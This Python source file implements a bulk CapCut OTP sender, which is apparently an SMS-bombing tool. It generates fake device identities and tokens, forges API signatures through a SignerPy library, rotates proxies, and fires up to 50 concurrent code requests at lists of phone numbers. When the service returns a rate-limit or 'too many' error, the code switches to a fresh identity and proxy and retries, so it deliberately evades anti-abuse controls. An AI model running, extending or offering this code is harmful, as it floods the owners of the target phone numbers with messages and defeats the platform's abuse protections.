#!/usr/bin/env python3
"""
CapCut OTP Sender - Core Logic (No Telegram dependencies)
========================================================
"""

import asyncio
import hashlib
import json
import os
import random
import string
import time
import uuid
import re
import io
import base64
from urllib.parse import urlencode
from typing import Optional, List, Dict, Set
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from collections import defaultdict
import pytz

import requests

# Import SignerPy for signature generation
try:
    from SignerPy import sign, xor, md5stub, trace_id
    SIGNERPY_AVAILABLE = True
except ImportError:
    SIGNERPY_AVAILABLE = False
    print("WARNING: SignerPy not available!")

# ============================================
# CONFIGURATION
# ============================================

PAKISTAN_TZ = pytz.timezone('Asia/Karachi')

# Performance settings
MAX_CONCURRENT_TASKS = 50
REQUESTS_PER_SECOND = 10
ZERO_DELAY = 0
MAX_MESSAGE_LENGTH = 4000

# ============================================
# PROFESSIONAL DEVICE ID GENERATOR
# ============================================

class DeviceIdentityGenerator:
    """Professional Device Identity Generator - Billions of unique combinations"""
    
    DEVICE_BRANDS = {
        "Samsung": ["SM-G991B", "SM-G996B", "SM-G998B", "SM-A525F", "SM-A725F", "SM-N986B", "SM-F926B", "SM-S901B", "SM-S906B", "SM-S908B", "SM-A536B", "SM-A346B", "SM-M536B", "SM-G781B"],
        "Xiaomi": ["M2101K6G", "M2102J20SG", "M2011K2G", "M2012K11AG", "22041219G", "22071219CG", "23049PCD8G", "2201116SG", "2203121C", "22101316G"],
        "OnePlus": ["LE2111", "LE2115", "LE2121", "LE2125", "NE2213", "CPH2449", "PHB110", "CPH2487", "NE2210", "LE2101"],
        "OPPO": ["CPH2145", "CPH2207", "CPH2247", "CPH2305", "CPH2371", "CPH2387", "CPH2451", "CPH2473", "CPH2493", "CPH2525"],
        "Vivo": ["V2111", "V2130", "V2145", "V2154", "V2185", "V2203", "V2217", "V2227", "V2241", "V2254"],
        "Realme": ["RMX3085", "RMX3161", "RMX3195", "RMX3241", "RMX3286", "RMX3370", "RMX3393", "RMX3474", "RMX3521", "RMX3630"],
        "Huawei": ["ELS-NX9", "NOH-NX9", "JAD-LX9", "OCE-AN10", "ANA-NX9", "LIO-N29", "TET-AN00", "ABR-AL80", "DCO-AL00", "NAM-AL00"],
        "Google": ["Pixel 6", "Pixel 6 Pro", "Pixel 7", "Pixel 7 Pro", "Pixel 8", "Pixel 8 Pro", "Pixel 6a", "Pixel 7a", "Pixel 8a", "Pixel Fold"],
        "Motorola": ["XT2175-2", "XT2201-2", "XT2225-1", "XT2237-2", "XT2251-1", "XT2301-4", "XT2343-1", "XT2361-3", "XT2381-3", "XT2401-3"],
        "Itel": ["itel S685LN", "itel A665L", "itel P55", "itel S23", "itel A70", "itel P40", "itel S18", "itel A60", "itel P65", "itel S24"],
        "Infinix": ["X6831", "X6711", "X6871", "X6833B", "X6739", "X6710", "X6837", "X6525", "X6528", "X6826"],
        "Tecno": ["CK7n", "CK8n", "CK9n", "CH9n", "CL8", "CL7n", "CK6n", "CH7n", "CK8", "CL6"],
    }
    
    GPU_RENDERS = [
        "Mali-G57", "Mali-G68", "Mali-G77", "Mali-G78", "Mali-G710", "Mali-G715",
        "Adreno 619", "Adreno 642L", "Adreno 650", "Adreno 660", "Adreno 730", "Adreno 740",
        "PowerVR GE8320", "PowerVR GM9446", "IMG BXM-8-256",
    ]
    
    ANDROID_VERSIONS = ["11", "12", "12L", "13", "14", "15"]
    API_LEVELS = {"11": "30", "12": "31", "12L": "32", "13": "33", "14": "34", "15": "35"}
    
    BUILD_IDS = [
        "TP1A.220624.014", "SP1A.210812.016", "RQ3A.211001.001", "SQ3A.220705.003",
        "TQ3A.230901.001", "UP1A.231005.007", "AP3A.240905.015", "BP1A.250305.019",
    ]
    
    CRONET_VERSIONS = ["01594da2_2023-03-14", "02785bc3_2023-06-20", "03896cd4_2023-09-15"]
    TTNET_VERSIONS = ["4.1.130.2-tudp", "4.1.131.5-tudp", "4.1.132.8-tudp"]
    
    def __init__(self):
        self.used_device_ids: Set[str] = set()
        self.used_iids: Set[str] = set()
        self.generation_count = 0
    
    def _generate_unique_19_digit_id(self, used_set: Set[str]) -> str:
        for _ in range(100):
            prefix = random.choice(["69", "70", "71", "72", "73", "74", "75", "76", "77", "78"])
            device_id = prefix + ''.join(random.choices(string.digits, k=17))
            if device_id not in used_set:
                used_set.add(device_id)
                return device_id
        fallback_id = prefix + str(uuid.uuid4().int)[:17]
        used_set.add(fallback_id)
        return fallback_id
    
    def generate_fresh_identity(self) -> Dict:
        self.generation_count += 1
        
        brand = random.choice(list(self.DEVICE_BRANDS.keys()))
        model = random.choice(self.DEVICE_BRANDS[brand])
        android_version = random.choice(self.ANDROID_VERSIONS)
        api_level = self.API_LEVELS[android_version]
        
        device_id = self._generate_unique_19_digit_id(self.used_device_ids)
        iid = self._generate_unique_19_digit_id(self.used_iids)
        openudid = ''.join(random.choices('0123456789abcdef', k=16))
        cdid = str(uuid.uuid4())
        did = f"00000000-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:4]}-ffff-ffff{uuid.uuid4().hex[:8]}"
        
        gpu_render = random.choice(self.GPU_RENDERS)
        build_id = random.choice(self.BUILD_IDS)
        cronet_version = random.choice(self.CRONET_VERSIONS)
        ttnet_version = random.choice(self.TTNET_VERSIONS)
        
        resolutions = ["1080*2400", "1080*2340", "1080*2436", "1440*3200", "1080*2520", "720*1600"]
        resolution = random.choice(resolutions)
        dpi = random.choice(["420", "440", "480", "560", "640"])
        total_memory = str(random.randint(4000, 12000))
        available_memory = str(random.randint(1000, 4000))
        
        ms_token_base = ''.join(random.choices(string.ascii_letters + string.digits, k=50))
        ms_token = f"CmAdOS08A7OC5uDiAzJEpwrlDz1CC_{ms_token_base}="
        odin_tt = ''.join(random.choices('0123456789abcdef', k=128))
        csrf_token = ''.join(random.choices('0123456789abcdef', k=32))
        
        return {
            "device_id": device_id, "iid": iid, "openudid": openudid, "cdid": cdid, "did": did,
            "device_type": model, "device_brand": brand, "model": model, "manu": brand.upper(),
            "gpu_render": gpu_render, "os_api": api_level, "os_version": android_version,
            "resolution": resolution, "dpi": dpi, "total_memory": total_memory,
            "available_memory": available_memory, "build_id": build_id,
            "cronet_version": cronet_version, "ttnet_version": ttnet_version,
            "ms_token": ms_token, "odin_tt": odin_tt, "csrf_token": csrf_token,
            "generation_number": self.generation_count,
        }
    
    def get_stats(self) -> Dict:
        return {
            "total_generated": self.generation_count,
            "unique_device_ids": len(self.used_device_ids),
            "unique_iids": len(self.used_iids),
        }


# ============================================
# PROXY MANAGER
# ============================================

class ProxyManager:
    def __init__(self, proxies: List[str] = None):
        self.proxies = proxies or []
        self.current_index = 0
        self.failed_proxies: Set[int] = set()
    
    def add_proxies(self, proxy_list: List[str]):
        self.proxies.extend(proxy_list)
    
    def get_current_proxy(self) -> Optional[str]:
        if not self.proxies:
            return None
        return self.proxies[self.current_index % len(self.proxies)]
    
    def get_next_proxy(self) -> Optional[str]:
        if not self.proxies:
            return None
        self.current_index = (self.current_index + 1) % len(self.proxies)
        return self.proxies[self.current_index]
    
    def mark_failed(self, proxy: str):
        try:
            idx = self.proxies.index(proxy)
            self.failed_proxies.add(idx)
        except ValueError:
            pass
    
    def get_fresh_proxy(self) -> Optional[str]:
        if not self.proxies:
            return None
        for _ in range(min(len(self.proxies), 100)):
            proxy = self.get_next_proxy()
            if self.current_index not in self.failed_proxies:
                return proxy
        self.failed_proxies.clear()
        return self.get_next_proxy()
    
    def reset(self):
        self.current_index = 0
        self.failed_proxies.clear()
    
    def get_count(self) -> int:
        return len(self.proxies)


# ============================================
# CAPCUT OTP SENDER
# ============================================

class CapCutOTPSender:
    """CapCut OTP Sender with SignerPy signatures"""
    
    BASE_URL = "https://passport16-normal-sg.capcutapi.com"
    ENDPOINT = "/passport/mobile/send_code/v1/"
    
    BASE_CONFIG = {
        "app_name": "vicut", "aid": 3006, "version_code": "9200400", "version_name": "9.3.0",
        "manifest_version_code": "9300200", "update_version_code": "9200400",
        "app_sdk_version": "83.0.0", "passport_sdk_version": "30876",
        "effect_sdk_version": "14.9.0", "os": "android", "device_platform": "android",
        "channel": "googleplay", "carrier_region": "US", "mcc_mnc": "310160",
        "region": "US", "language": "en", "ac": "wifi", "ssmix": "a",
        "subdivision_id": "US-CA", "user_type": "0",
    }
    
    def __init__(self, identity_generator: DeviceIdentityGenerator, proxy_manager: ProxyManager):
        self.identity_generator = identity_generator
        self.proxy_manager = proxy_manager
        self.current_identity = None
    
    def _create_session(self, proxy: Optional[str] = None) -> requests.Session:
        session = requests.Session()
        if proxy:
            if not proxy.startswith("http") and not proxy.startswith("socks"):
                proxy = f"http://{proxy}"
            session.proxies = {"http": proxy, "https": proxy}
        return session
    
    def refresh_identity(self) -> Dict:
        self.current_identity = self.identity_generator.generate_fresh_identity()
        return self.current_identity
    
    def _get_config(self) -> Dict:
        if not self.current_identity:
            self.refresh_identity()
        config = self.BASE_CONFIG.copy()
        config.update({
            "device_id": self.current_identity["device_id"],
            "iid": self.current_identity["iid"],
            "openudid": self.current_identity["openudid"],
            "cdid": self.current_identity["cdid"],
            "did": self.current_identity["did"],
            "device_type": self.current_identity["device_type"],
            "device_brand": self.current_identity["device_brand"],
            "model": self.current_identity["model"],
            "manu": self.current_identity["manu"],
            "gpu_render": self.current_identity["gpu_render"],
            "os_api": self.current_identity["os_api"],
            "os_version": self.current_identity["os_version"],
            "resolution": self.current_identity["resolution"],
            "dpi": self.current_identity["dpi"],
            "total_memory": self.current_identity["total_memory"],
            "available_memory": self.current_identity["available_memory"],
            "cronet_version": self.current_identity["cronet_version"],
            "ttnet_version": self.current_identity["ttnet_version"],
        })
        return config
    
    def _get_cookies(self) -> Dict:
        if not self.current_identity:
            self.refresh_identity()
        return {
            "odin_tt": self.current_identity["odin_tt"],
            "msToken": self.current_identity["ms_token"],
            "passport_csrf_token": self.current_identity["csrf_token"],
            "passport_csrf_token_default": self.current_identity["csrf_token"],
            "store-idc": "alisg",
        }
    
    def _encrypt_phone(self, phone_number: str) -> str:
        if SIGNERPY_AVAILABLE:
            return xor(phone_number)
        encrypted = ""
        for char in phone_number:
            encrypted_byte = ord(char) ^ 5
            encrypted += format(encrypted_byte, '02x')
        return encrypted
    
    def _encode_base64(self, text: str) -> str:
        return base64.b64encode(text.encode()).decode()
    
    def _build_url_params(self, config: Dict, timestamp: int) -> str:
        rticket = str(timestamp * 1000 + random.randint(0, 999))
        params = {
            "passport-sdk-version": config["passport_sdk_version"],
            "iid": config["iid"], "device_id": config["device_id"],
            "ac": config["ac"], "channel": config["channel"],
            "aid": str(config["aid"]), "app_name": config["app_name"],
            "version_code": config["version_code"], "version_name": config["version_name"],
            "device_platform": config["device_platform"], "os": config["os"],
            "ssmix": config["ssmix"], "device_type": config["device_type"],
            "device_brand": config["device_brand"], "language": config["language"],
            "os_api": config["os_api"], "os_version": config["os_version"],
            "openudid": config["openudid"], "manifest_version_code": config["manifest_version_code"],
            "resolution": config["resolution"], "dpi": config["dpi"],
            "update_version_code": config["update_version_code"], "_rticket": rticket,
            "carrier_region": config["carrier_region"], "mcc_mnc": config["mcc_mnc"],
            "region": config["region"], "cdid": config["cdid"],
            "effect_sdk_version": config["effect_sdk_version"],
            "subdivision_id": config["subdivision_id"], "user_type": config["user_type"],
            "cronet_version": config["cronet_version"], "ttnet_version": config["ttnet_version"],
            "use_store_region_cookie": "1",
        }
        return urlencode(params)
    
    def _build_body(self, phone_number: str, config: Dict, timestamp: int) -> str:
        encrypted_mobile = self._encrypt_phone(phone_number)
        rticket = str(timestamp * 1000 + random.randint(0, 999))
        params = {
            "auto_read": "1", "account_sdk_source": "app", "unbind_exist": "35",
            "mix_mode": "1", "mobile": encrypted_mobile, "is6Digits": "1", "type": "3635",
            "iid": config["iid"], "device_id": config["device_id"],
            "ac": config["ac"], "channel": config["channel"],
            "aid": str(config["aid"]), "app_name": config["app_name"],
            "version_code": config["version_code"], "version_name": config["version_name"],
            "device_platform": config["device_platform"], "os": config["os"],
            "ssmix": config["ssmix"], "device_type": config["device_type"],
            "device_brand": config["device_brand"], "language": config["language"],
            "os_api": config["os_api"], "os_version": config["os_version"],
            "openudid": config["openudid"], "manifest_version_code": config["manifest_version_code"],
            "resolution": config["resolution"], "dpi": config["dpi"],
            "update_version_code": config["update_version_code"], "_rticket": rticket,
            "carrier_region": config["carrier_region"], "mcc_mnc": config["mcc_mnc"],
            "region": config["region"], "cdid": config["cdid"],
        }
        return urlencode(params)
    
    def _build_cookie_string(self, cookies: Dict) -> str:
        return "; ".join([f"{k}={v}" for k, v in cookies.items()])
    
    def _generate_signatures(self, url_params: str, body: str, cookie: str, config: Dict) -> Dict:
        if not SIGNERPY_AVAILABLE:
            raise Exception("SignerPy library not available!")
        return sign(params=url_params, payload=body, cookie=cookie, version=8404, aid=config["aid"])
    
    def _build_headers(self, config: Dict, cookies: Dict, timestamp: int, signatures: Dict) -> Dict:
        return {
            "Host": "passport16-normal-sg.capcutapi.com",
            "Connection": "keep-alive",
            "Cookie": self._build_cookie_string(cookies),
            "lan": "en", "loc": "US", "pf": "0", "vr": "277884928", "appvr": "9.2.0",
            "vc": config["version_code"], "device-time": str(timestamp),
            "tdid": config["device_id"], "sign-ver": "1",
            "sign": hashlib.md5(f"{timestamp}{config['device_id']}".encode()).hexdigest(),
            "app-sdk-version": config["app_sdk_version"], "appid": str(config["aid"]),
            "header-content": f"ode/v1/|0|9.2.0|{timestamp}|{config['device_id']}",
            "host-abi": "64", "cc-newuser-channel": "common", "Cache-Control": "no-cache",
            "sysvr": config["os_api"], "ch": config["channel"], "uid": "0",
            "COMPRESSED": "1", "did": config["did"],
            "model": self._encode_base64(config["model"]),
            "manu": self._encode_base64(config["manu"]),
            "GPURender": self._encode_base64(config["gpu_render"]),
            "HDR-TDID": config["device_id"], "HDR-TIID": config["iid"],
            "HDR-Device-Time": str(timestamp), "version_code": "277884928",
            "total-memory": config["total_memory"], "available-memory": config["available_memory"],
            "HDR-Sign": hashlib.md5(f"{timestamp}{config['iid']}".encode()).hexdigest(),
            "HDR-Sign-Ver": "1", "x-tt-passport-csrf-token": cookies["passport_csrf_token"],
            "x-vc-bdturing-sdk-version": "2.3.0.i18n", "sdk-version": "2",
            "passport-sdk-version": config["passport_sdk_version"],
            "commerce-sign-version": "v1", "region": config["region"],
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-SS-STUB": signatures.get("x-ss-stub", ""),
            "X-SS-DP": str(config["aid"]),
            "x-tt-trace-id": trace_id(device_id=config["device_id"]) if SIGNERPY_AVAILABLE else "",
            "User-Agent": f"com.lemon.lvoverseas/{config['manifest_version_code']} (Linux; U; Android {config['os_version']}; en_US; {config['device_type']}; Build/{self.current_identity.get('build_id', 'AP3A.240905.015.A2')}; Cronet/TTNetVersion:{config['cronet_version'].split('_')[0]} {config['cronet_version'].split('_')[1]} QuicVersion:46688bb4 2022-11-28)",
            "Accept-Encoding": "gzip, deflate",
            "X-Gorgon": signatures.get("x-gorgon", ""),
            "X-Khronos": signatures.get("x-khronos", ""),
            "X-Argus": signatures.get("x-argus", ""),
            "X-Ladon": signatures.get("x-ladon", ""),
        }
    
    def send_otp(self, phone_number: str, proxy: Optional[str] = None) -> Dict:
        phone = phone_number.strip().replace(" ", "").replace("-", "")
        if not phone.startswith("+"):
            phone = "+" + phone
        
        start_time = time.time()
        
        config = self._get_config()
        cookies = self._get_cookies()
        timestamp = int(time.time())
        
        url_params = self._build_url_params(config, timestamp)
        body = self._build_body(phone, config, timestamp)
        cookie_str = self._build_cookie_string(cookies)
        
        try:
            signatures = self._generate_signatures(url_params, body, cookie_str, config)
        except Exception as e:
            return {"error": str(e), "success": False, "time_ms": (time.time() - start_time) * 1000}
        
        headers = self._build_headers(config, cookies, timestamp, signatures)
        url = f"{self.BASE_URL}{self.ENDPOINT}?{url_params}"
        
        session = self._create_session(proxy)
        
        try:
            response = session.post(url, data=body, headers=headers, timeout=15)
            elapsed = (time.time() - start_time) * 1000
            try:
                result = response.json()
                result["success"] = result.get("message") == "success"
                result["proxy_used"] = proxy or "Direct"
                result["device_id"] = config["device_id"]
                result["time_ms"] = elapsed
                return result
            except json.JSONDecodeError:
                return {"error": "Invalid JSON response", "raw": response.text[:200], "success": False, "time_ms": elapsed}
        except requests.exceptions.RequestException as e:
            elapsed = (time.time() - start_time) * 1000
            return {"error": str(e), "success": False, "time_ms": elapsed}
        finally:
            session.close()


# ============================================
# TASK MANAGEMENT
# ============================================

@dataclass
class Task:
    task_id: str
    phone_numbers: List[str]
    proxies: List[str]
    status: str = "pending"
    current_index: int = 0
    success_count: int = 0
    fail_count: int = 0
    cancelled: bool = False
    chat_id: str = ""


class TaskManager:
    def __init__(self):
        self.tasks: Dict[str, Task] = {}
        self.running_tasks: Set[str] = set()
        self.task_counter = 0
    
    async def create_task(self, phone_numbers: List[str], proxies: List[str], chat_id: str) -> str:
        self.task_counter += 1
        task_id = f"task_{self.task_counter}"
        task = Task(task_id=task_id, phone_numbers=phone_numbers, proxies=proxies, chat_id=chat_id)
        self.tasks[task_id] = task
        return task_id
    
    def get_task(self, task_id: str) -> Optional[Task]:
        return self.tasks.get(task_id)
    
    async def cancel_task(self, task_id: str) -> bool:
        task = self.tasks.get(task_id)
        if task:
            task.cancelled = True
            task.status = "cancelled"
            return True
        return False
    
    def get_running_count(self) -> int:
        return len(self.running_tasks)
    
    def get_all_tasks(self) -> List[Task]:
        return list(self.tasks.values())


# ============================================
# UTILITY FUNCTIONS
# ============================================

def get_pakistan_time() -> datetime:
    return datetime.now(PAKISTAN_TZ)


def parse_phone_numbers(text: str) -> List[str]:
    """Extract phone numbers from text, ignoring English text"""
    numbers = re.findall(r'[\+]?[\d\s\-\(\)]{10,20}', text)
    valid = []
    for num in numbers:
        clean = re.sub(r'[\s\-\(\)]', '', num)
        if len(clean) >= 10 and clean.replace('+', '').isdigit():
            valid.append(clean)
    return list(set(valid))


def parse_proxies(text: str) -> List[str]:
    """Parse proxies from text"""
    lines = text.strip().split('\n')
    proxies = []
    for line in lines:
        line = line.strip()
        if line and ':' in line:
            proxies.append(line)
    return proxies


# Global instances
identity_generator = DeviceIdentityGenerator()
task_manager = TaskManager()
senders = {}


async def run_bulk_task(task):
    """Run bulk OTP task with 50 concurrent requests"""
    proxy_manager = ProxyManager(task.proxies.copy() if task.proxies else [])
    sender = CapCutOTPSender(identity_generator, proxy_manager)
    senders[task.task_id] = sender
    task_manager.running_tasks.add(task.task_id)
    
    semaphore = asyncio.Semaphore(50)
    total = len(task.phone_numbers)
    processed = 0
    
    async def send_one(phone: str, index: int):
        async with semaphore:
            if task.cancelled:
                return
            
            identity = sender.refresh_identity()
            current_proxy = proxy_manager.get_current_proxy()
            
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(None, sender.send_otp, phone, current_proxy)
            attempts = 1
            
            if not result.get("success"):
                error_desc = str(result.get("data", {}).get("description", result.get("error", ""))).lower()
                limit_keywords = ["limit", "frequency", "maximum", "too many", "often", "error", "timeout"]
                
                if any(kw in error_desc for kw in limit_keywords):
                    identity = sender.refresh_identity()
                    result = await loop.run_in_executor(None, sender.send_otp, phone, current_proxy)
                    attempts = 2
                    
                    if not result.get("success"):
                        identity = sender.refresh_identity()
                        new_proxy = proxy_manager.get_fresh_proxy()
                        result = await loop.run_in_executor(None, sender.send_otp, phone, new_proxy)
                        attempts = 3
                        current_proxy = new_proxy
            
            if result.get("success"):
                task.success_count += 1
            else:
                task.fail_count += 1
            
            nonlocal processed
            processed += 1
            task.current_index = processed
            
            # Small yield to allow status queries
            if processed % 10 == 0:
                await asyncio.sleep(0.01)
    
    # Launch all tasks concurrently with semaphore
    await asyncio.gather(
        *[send_one(phone, i) for i, phone in enumerate(task.phone_numbers)],
        return_exceptions=True
    )
    
    task.status = "completed" if not task.cancelled else "cancelled"
    task_manager.running_tasks.discard(task.task_id)
    if task.task_id in senders:
        del senders[task.task_id]
